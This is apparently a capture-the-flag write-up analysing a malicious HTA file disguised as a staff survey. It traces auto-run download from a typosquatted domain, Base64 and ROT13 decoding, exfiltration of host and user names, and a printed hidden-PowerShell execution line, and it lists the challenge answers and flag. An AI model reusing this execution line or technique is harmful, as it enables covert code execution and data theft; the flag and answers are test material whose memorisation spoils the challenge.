# Malware Analysis - Malhare.exe

## Challenge Overview
This challenge focused on analysing a **malicious HTA (HTML Application)** file that was delivered as a fake salary survey.
Although HTA files are legitimate Windows automation tools, attackers abused their ability to execute scripts via `mshta.exe` to perform reconnaissance, 
exfiltrate host information, and execute hidden payloads. The goal was to reverse-engineer the HTA logic, identify malicious behaviour, decode the embedded payload,
and recover the final flag.

## Learnings
From this challenge, I learned:
- What HTA files are and how they differ from regular HTML files
- How attackers abuse VBScript + PowerShell inside HTAs
- How Base64 and ROT13 are used together for obfuscation
- How to trace malicious execution paths inside script-based malware
- How social engineering is embedded directly into malicious code

## My Solve 
I opened the HTA file using a text editor to avoid execution and first examined the <head> section to identify how the application presented itself. 
The title clearly showed it was masquerading as a legitimate internal survey. I then located the <script type="text/vbscript"> section and enumerated all defined functions. 
The window_onLoad() function automatically executed getQuestions(), which downloaded external data under the guise of survey questions. 
The download originated from a typosquatted domain and was passed through a Base64 decoding routine before being handed to provideFeedback().

Inside provideFeedback(), the script collected host information using WScript.Network, specifically the ComputerName and UserName, and exfiltrated this data via an HTTP GET 
request to the /details endpoint. Crucially, the downloaded content was not just data — it was executed using PowerShell through the following line:
`runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False`

Since the original malware server was offline, I downloaded the preserved payload provided in the challenge. The payload was Base64-encoded, and once decoded,
it revealed an additional layer of ROT13 obfuscation. After decoding both layers, the final script revealed the flag.


## Flag / Answers
- HTA title: **Best Festival Company Developer Survey**
- Survey download function: **getQuestions**
- Malicious domain: **survey.bestfestiivalcompany.com**
- Typosquatting character: **i**
- Number of survey questions: **4**
- Promised trip location: **South Pole**
- Exfiltrated host data: **ComputerName,UserName**
- Exfiltration endpoint: **/details**
- HTTP method used: **GET**
- Payload execution line: `runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False`
- Initial obfuscation: **Base64**
- Secondary obfuscation: **ROT13**
- Final flag: ```THM{Malware.Analysed}```
